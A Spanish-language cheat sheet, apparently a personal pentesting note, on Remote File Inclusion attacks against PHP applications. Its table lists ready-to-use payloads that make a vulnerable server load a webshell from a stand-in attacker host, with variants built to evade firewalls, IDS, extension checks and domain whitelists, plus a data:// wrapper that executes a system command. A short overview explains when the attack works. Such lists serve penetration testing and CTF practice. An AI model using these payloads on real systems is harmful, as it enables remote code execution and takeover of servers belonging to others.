---
aliases:
tags:
  - type/cheatsheet
primary categories:
secondary categories:
tertiary categories:
type: CheatSheet
linked:
---
# LFI - Remote File Inclusion (RFI)

***

## Cheatsheet

| Técnica                        | Descripción                                                                   | Payload                                                  |
| ------------------------------ | ----------------------------------------------------------------------------- | -------------------------------------------------------- |
| <br>RFI básico                 | <br>Incluir un archivo remoto desde tu servidor<br><br>                       | <br>`?page=http://attacker.com/shell.php`                |
| <br>RFI con HTTPS              | <br>Usar HTTPS para evadir firewalls o IDS<br><br>                            | <br>`?page=https://attacker.com/shell.php`               |
| <br>RFI con null byte          | <br>Truncar extensión concatenada por el servidor<br><br>                     | <br>`?page=http://attacker.com/shell.php%00`             |
| <br>RFI con parámetro extra    | <br>Agregar `?` para que la extensión se interprete como query string<br><br> | <br>`?page=http://attacker.com/shell.php?`               |
| <br>RFI con encode URL         | <br>Encodear la URL para evadir filtros de protocolo<br><br>                  | <br>`?page=http:%2f%2fattacker.com%2fshell.php`          |
| <br>RFI con acortador/redirect | <br>Usar una URL que redirige al payload real<br><br>                         | <br>`?page=http://bit.ly/xxxxx`                          |
| <br>RFI vía FTP                | <br>Usar protocolo FTP en vez de HTTP<br><br>                                 | <br>`?page=ftp://attacker.com/shell.php`                 |
| <br>RFI con archivo .txt       | <br>Servir el payload como .txt para evadir validaciones de extensión<br><br> | <br>`?page=http://attacker.com/shell.txt`                |
| <br>RFI con wrapper data       | <br>Simular un recurso remoto con data://<br><br>                             | <br>`?page=data://text/plain,<?php system('id'); ?>`     |
| <br>RFI bypass de whitelist    | <br>Usar subdominios o paths que matcheen la validación<br><br>               | <br>`?page=http://allowed-domain.attacker.com/shell.php` |

***

## Overview

RFI es la versión más peligrosa de file inclusion porque permite incluir archivos desde un servidor externo controlado por el atacante, logrando RCE directamente. Sin embargo, es mucho menos común que LFI porque requiere que `allow_url_include` esté en `On` en la configuración de PHP, lo cual viene deshabilitado por defecto desde PHP 5.2. Cuando está disponible, el impacto es inmediato: el atacante hostea una webshell en su servidor y la incluye remotamente. La defensa principal ya viene aplicada de fábrica, por eso en la práctica se encuentra casi exclusivamente en sistemas legacy o mal configurados.


***

## Notas Relacionadas


***
